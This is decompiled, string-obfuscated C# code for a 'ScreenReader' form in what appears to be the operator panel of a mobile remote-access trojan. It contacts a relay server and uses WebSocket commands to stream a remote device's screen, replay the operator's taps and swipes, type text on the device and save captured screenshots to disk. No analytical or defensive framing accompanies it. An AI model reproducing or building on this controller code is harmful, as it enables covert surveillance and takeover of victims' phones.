		this.DrakeUIButtonIcon9.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.DrakeUIButtonIcon9.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon9.ForeHoverColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon9.Location = new System.Drawing.Point(3, 3);
		this.DrakeUIButtonIcon9.Name = EXGuarder._3B70065F;
		this.DrakeUIButtonIcon9.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon9.RectColor = System.Drawing.Color.Gray;
		this.DrakeUIButtonIcon9.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon9.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon9.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon9.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon9.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon9.Size = new System.Drawing.Size(143, 21);
		this.DrakeUIButtonIcon9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon9.Symbol = 61641;
		this.DrakeUIButtonIcon9.TabIndex = 21;
		this.inputtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.inputtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.inputtext.ForeColor = System.Drawing.Color.White;
		this.inputtext.Location = new System.Drawing.Point(2, 965);
		this.inputtext.Margin = new System.Windows.Forms.Padding(4);
		this.inputtext.Maximum = 2147483647.0;
		this.inputtext.Minimum = -2147483648.0;
		this.inputtext.Name = EXGuarder._3A3A7876;
		this.inputtext.Padding = new System.Windows.Forms.Padding(4);
		this.inputtext.Radius = 15;
		this.inputtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext.Size = new System.Drawing.Size(448, 25);
		this.inputtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext.TabIndex = 67;
		this.inputtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext.Watermark = EXGuarder._0902763B;
		this.statetimer.Interval = 1000;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.switchmod);
		this.Panel3.Controls.Add(this.saveit);
		this.Panel3.Controls.Add(this.zoom_out);
		this.Panel3.Controls.Add(this.zoom_in);
		this.Panel3.Controls.Add(this.autorotbtn);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 104);
		this.Panel3.Name = EXGuarder._5710516F;
		this.Panel3.Size = new System.Drawing.Size(448, 40);
		this.Panel3.TabIndex = 68;
		this.switchmod.Cursor = System.Windows.Forms.Cursors.Hand;
		this.switchmod.Dock = System.Windows.Forms.DockStyle.Right;
		this.switchmod.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.switchmod.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.switchmod.ForeHoverColor = System.Drawing.Color.Gray;
		this.switchmod.Location = new System.Drawing.Point(396, 0);
		this.switchmod.Name = EXGuarder._67144017;
		this.switchmod.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.switchmod.RectColor = System.Drawing.Color.Gray;
		this.switchmod.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.switchmod.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.switchmod.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.switchmod.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.switchmod.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.switchmod.Size = new System.Drawing.Size(52, 40);
		this.switchmod.Style = DrakeUI.Framework.UIStyle.Custom;
		this.switchmod.Symbol = 61499;
		this.switchmod.TabIndex = 54;
		this.switchmod.Tag = EXGuarder._4C4E6D23;
		this.switchmod.TagString = EXGuarder._5C105352;
		this.zoom_out.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.zoom_out.Cursor = System.Windows.Forms.Cursors.Hand;
		this.zoom_out.Dock = System.Windows.Forms.DockStyle.Left;
		this.zoom_out.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_out.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_out.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_out.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_out.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.zoom_out.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.zoom_out.ForeHoverColor = System.Drawing.Color.Gray;
		this.zoom_out.Location = new System.Drawing.Point(104, 0);
		this.zoom_out.Name = EXGuarder._2F690D12;
		this.zoom_out.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.zoom_out.RectColor = System.Drawing.Color.Gray;
		this.zoom_out.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.zoom_out.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_out.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.zoom_out.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.zoom_out.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.zoom_out.Size = new System.Drawing.Size(52, 40);
		this.zoom_out.Style = DrakeUI.Framework.UIStyle.Custom;
		this.zoom_out.Symbol = 57427;
		this.zoom_out.SymbolSize = 30;
		this.zoom_out.TabIndex = 34;
		this.zoom_out.Tag = EXGuarder._5C105352;
		this.zoom_in.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.zoom_in.Cursor = System.Windows.Forms.Cursors.Hand;
		this.zoom_in.Dock = System.Windows.Forms.DockStyle.Left;
		this.zoom_in.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_in.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_in.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_in.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_in.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.zoom_in.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.zoom_in.ForeHoverColor = System.Drawing.Color.Gray;
		this.zoom_in.Location = new System.Drawing.Point(52, 0);
		this.zoom_in.Name = EXGuarder._5102260F;
		this.zoom_in.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.zoom_in.RectColor = System.Drawing.Color.Gray;
		this.zoom_in.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.zoom_in.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.zoom_in.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.zoom_in.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.zoom_in.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.zoom_in.Size = new System.Drawing.Size(52, 40);
		this.zoom_in.Style = DrakeUI.Framework.UIStyle.Custom;
		this.zoom_in.Symbol = 57428;
		this.zoom_in.SymbolSize = 30;
		this.zoom_in.TabIndex = 34;
		this.zoom_in.Tag = EXGuarder._5C105352;
		this.autorotbtn.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.autorotbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.autorotbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.autorotbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.Font = new System.Drawing.Font(EXGuarder._21372768, 9f);
		this.autorotbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.autorotbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.autorotbtn.Location = new System.Drawing.Point(0, 0);
		this.autorotbtn.Name = EXGuarder._0E16595C;
		this.autorotbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.autorotbtn.RectColor = System.Drawing.Color.Gray;
		this.autorotbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.autorotbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.autorotbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.autorotbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.autorotbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.autorotbtn.Size = new System.Drawing.Size(52, 40);
		this.autorotbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.autorotbtn.Symbol = 61965;
		this.autorotbtn.SymbolSize = 30;
		this.autorotbtn.TabIndex = 53;
		this.autorotbtn.Tag = EXGuarder._5C105352;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(452, 992);
		base.Controls.Add(this.viewimage);
		base.Controls.Add(this.TableLayoutPanel1);
		base.Controls.Add(this.inputtext);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._740F4368);
		base.Name = EXGuarder._11544F49;
		this.Text = EXGuarder._11544F49;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.inputtext, 0);
		base.Controls.SetChildIndex(this.TableLayoutPanel1, 0);
		base.Controls.SetChildIndex(this.viewimage, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewimage).EndInit();
		this.TableLayoutPanel1.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
	}

	private void ScreenReader_Load(object sender, EventArgs e)
	{
		checked
		{
			base.Height += 25;
			myico.Image = Btcli.wallpaper;
			translateme();
			statetimer.Start();
		}
	}

	private void ScreenReader_Closing(object sender, CancelEventArgs e)
	{
		statetimer.Stop();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string _1A = EXGuarder._1A677924;
			if (FPS > 0 && stopbtn.Enabled)
			{
				_1A = EXGuarder._1C474149 + FPS;
				FPS = 0;
			}
			else
			{
				_1A = EXGuarder._57144840;
			}
			if (Btcli.isConnected)
			{
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.screnraderstr + EXGuarder._69403F22 + Btcli.name + EXGuarder._69403F22 + Btcli.country + EXGuarder._69403F22 + _1A;
			}
			else
			{
				myico.Image = Resources.no_con;
				mytitle.Text = BTConst.screnraderstr + EXGuarder._69403F22 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private async void startbtn_Click(object sender, EventArgs e)
	{
		if (!startbtn.Enabled)
		{
			return;
		}
		string serverNextKey = ServersMgr.GetServerNextKey(Btcli.Serverins.Address);
		string json = await MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "0", serverNextKey), Btcli.Serverins.MainhttpClient, Btcli.Serverins.Address);
		string value = Btcli.SecoundIDF;
		JObject jObject = JObject.Parse(json);
		if (jObject["Success"] != null)
		{
			_Closure_0024__96_002D0 arg = default(_Closure_0024__96_002D0);
			_Closure_0024__96_002D0 CS_0024_003C_003E8__locals7 = new _Closure_0024__96_002D0(arg);
			CS_0024_003C_003E8__locals7._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr = jObject["Success"].ToString().Trim('"');
			Debuger.Log_d("Cli IDF websock", CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			websockclient = new WebSocketClient(BTConst.screnraderstr, Btcli.address, Btcli.Serverins);
			Thread thread = new Thread([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals7._0024VB_0024Me.websockclient.Connect(CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			});
			thread.IsBackground = true;
			thread.Start();
			do
			{
				Thread.Sleep(1);
			}
			while (!websockclient.IsConnected);
			Debuger.Log_d("IDF Ready to use", CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr);
			value = CS_0024_003C_003E8__locals7._0024VB_0024Local_datastr;
		}
		Dictionary<string, object> chatData = new Dictionary<string, object>
		{
			{ "msg", "scread" },
			{ "skidf", value },
			{ "cas", "1" }
		};
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		startbtn.Enabled = false;
		stopbtn.Enabled = true;
		myscr.Visible = true;
	}

	private void stopbtn_Click(object sender, EventArgs e)
	{
		if (stopbtn.Enabled)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._673F3B44, EXGuarder._4A635224);
			dictionary.Add(EXGuarder._74765033, EXGuarder._29307409);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			startbtn.Enabled = true;
			stopbtn.Enabled = false;
			viewimage.Image = null;
			myscr.Visible = false;
			if (websockclient != null)
			{
				websockclient.Disconnect(BTConst.screnraderstr, Btcli.address);
				websockclient = null;
			}
		}
	}

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._432A1404, EXGuarder._1C2A691D);
		dictionary.Add(EXGuarder._392A4145, EXGuarder._32125251);
		dictionary.Add(EXGuarder._32125251, EXGuarder._3A766B4B);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._191C5158, EXGuarder._0B284518);
		dictionary.Add(EXGuarder._0E313547, EXGuarder._25685065);
		dictionary.Add(EXGuarder._25685065, EXGuarder._28652779);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._7505632B, EXGuarder._37610118);
		dictionary.Add(EXGuarder._54606579, EXGuarder._1145356A);
		dictionary.Add(EXGuarder._1145356A, EXGuarder._62666104);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void inputtext_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			string text = inputtext.Text;
			e.SuppressKeyPress = true;
			if (codes.StrisEmpty(text))
			{
				BTAlerter.infos(EXGuarder._3A237606);
				return;
			}
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._5B505D54, EXGuarder._47303C13);
			dictionary.Add(EXGuarder._020A484E, EXGuarder._1D121468);
			dictionary.Add(EXGuarder._49235D34, text);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			inputtext.Text = EXGuarder._09554D1D;
		}
	}

	private void viewimage_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			trackPoints.Clear();
			startX = e.X;
			startY = e.Y;
			trackPoints.Add(new Point(startX, startY));
			isDown = true;
			isClick = true;
		}
	}

	private void viewimage_MouseMove(object sender, MouseEventArgs e)
	{
		if (!isDown)
		{
			return;
		}
		checked
		{
			int num = Math.Abs(e.X - startX);
			int num2 = Math.Abs(e.Y - startY);
			if ((num > dragThreshold) | (num2 > dragThreshold))
			{
				isClick = false;
				if ((e.X > 0) & (e.Y > 0))
				{
					trackPoints.Add(new Point(e.X, e.Y));
				}
			}
		}
	}

	private void viewimage_MouseUp(object sender, MouseEventArgs e)
	{
		if (screenSize == default(Size))
		{
			return;
		}
		isDown = false;
		int num = viewimage.Width;
		int num2 = viewimage.Height;
		checked
		{
			if (isClick)
			{
				string data = JsonConvert.SerializeObject(new VB_0024AnonymousType_31<int, int>((int)Math.Round((double)startX * ((double)screenSize.Width / (double)num)), (int)Math.Round((double)startY * ((double)screenSize.Height / (double)num2))));
				MoveScreen(EXGuarder._71735849, Btcli.mobid, data);
			}
			else if (trackPoints.Count > 0)
			{
				if ((e.X > 0) & (e.Y > 0))
				{
					trackPoints.Add(new Point(e.X, e.Y));
				}
				List<Point> source = trackPoints.Select([SpecialName] (Point p) => new Point((int)Math.Round((double)p.X * ((double)screenSize.Width / (double)num)), (int)Math.Round((double)p.Y * ((double)screenSize.Height / (double)num2)))).ToList();
				string data2 = string.Join(EXGuarder._58785309, source.Select([SpecialName] (Point p) => $"({p.X}, {p.Y})"));
				MoveScreen(EXGuarder._07306E49, Btcli.mobid, data2);
			}
		}
	}

	private void MoveScreen(string movetype, string id, object data)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0A632646, EXGuarder._260F4071);
		dictionary.Add(EXGuarder._17212538, EXGuarder._68410A56);
		dictionary.Add(EXGuarder._3B06111A, movetype);
		dictionary.Add(EXGuarder._4F124809, RuntimeHelpers.GetObjectValue(data));
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, id, Btcli.Serverins.WSClient);
	}

	private void ctrlbtn_Click(object sender, EventArgs e)
	{
		if (startbtn.Enabled)
		{
			BTAlerter.infos(EXGuarder._5D4E433D);
			return;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._6A62320F, EXGuarder._036E6E0F);
		dictionary.Add(EXGuarder._20460A40, EXGuarder._765C3327);
		dictionary.Add(EXGuarder._43316332, EXGuarder._21036C1D);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void zoom_out_Click(object sender, EventArgs e)
	{
		if (startbtn.Enabled)
		{
			BTAlerter.infos(EXGuarder._12772A12);
			return;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._49261B0A, EXGuarder._5D5A6954);
		dictionary.Add(EXGuarder._78751838, EXGuarder._59633E4C);
		dictionary.Add(EXGuarder._635C6A22, EXGuarder._150B3042);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void coloskeletonpick_ValueChanged(object sender, Color value)
	{
		Color color = value;
		string value2 = EXGuarder._5338430E + color.R.ToString(EXGuarder._53190573) + color.G.ToString(EXGuarder._53190573) + color.B.ToString(EXGuarder._53190573);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3E281650, EXGuarder._293C5960);
		dictionary.Add(EXGuarder._70564579, EXGuarder._185C0324);
		dictionary.Add(EXGuarder._1F292406, value2);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void saveit_Click(object sender, EventArgs e)
	{
		if (viewimage.Image == null)
		{
			return;
		}
		if (Operators.CompareString(saveit.Tag.ToString(), EXGuarder._641D5A4D, TextCompare: false) == 0)
		{
			saveit.Tag = EXGuarder._6D4B5928;
			savetimer.Start();
			saveit.ForeColor = Color.DeepSkyBlue;
			boSave = true;
		}
		else if (Operators.CompareString(saveit.Tag.ToString(), EXGuarder._6D4B5928, TextCompare: false) == 0)
		{
			saveit.Tag = EXGuarder._641D5A4D;
			saveit.ForeColor = Color.White;
			savetimer.Stop();
			string text = Btcli.userfolder + EXGuarder._07195A5E;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
			saveit.ForeColor = Color.White;
			saveit.BackColor = Color.Transparent;
			boSave = false;
		}
	}

	private void savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = Btcli.userfolder + EXGuarder._435E6C63;
			if (boSave)
			{
				if (newphoto)
				{
					newphoto = false;
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(text))
					{
						viewimage.Image.Save(text + EXGuarder._42025A63 + DateAndTime.Now.ToString(EXGuarder._0D132100) + EXGuarder._02194B49, ImageFormat.Jpeg);
					}
				}
			}
			else
			{
				savetimer.Stop();
				savetimer.Dispose();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.screnraderstr, Btcli.address);
			websockclient = null;
		}
	}

	private void autorotbtn_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(autorotbtn.Tag, EXGuarder._0478403F, TextCompare: false))
		{
			autorotbtn.Tag = EXGuarder._5E506366;
			autorotbtn.ForeColor = Color.FromArgb(2, 176, 117);
			autorotbtn.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			autorotbtn.Tag = EXGuarder._0478403F;
			autorotbtn.ForeColor = Color.White;
			autorotbtn.RectColor = Color.Gray;
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (startbtn.Enabled)
		{
			BTAlerter.infos(EXGuarder._76416E4A);
			return;
		}
		string _131A1E2F = EXGuarder._131A1E2F;
		if (Operators.CompareString(switchmod.TagString, EXGuarder._5C147170, TextCompare: false) == 0)
		{
			switchmod.TagString = EXGuarder._610B102A;
			_131A1E2F = EXGuarder._795F0D5F;
			switchmod.ForeColor = Color.Lime;
		}
		else
		{
			switchmod.TagString = EXGuarder._5C147170;
			_131A1E2F = EXGuarder._131A1E2F;
			switchmod.ForeColor = Color.FromArgb(145, 163, 182);
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._512E605E, EXGuarder._041A3C0F);
		dictionary.Add(EXGuarder._2D442D36, _131A1E2F);
		dictionary.Add(EXGuarder._5039193D, EXGuarder._2D644157);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}
}
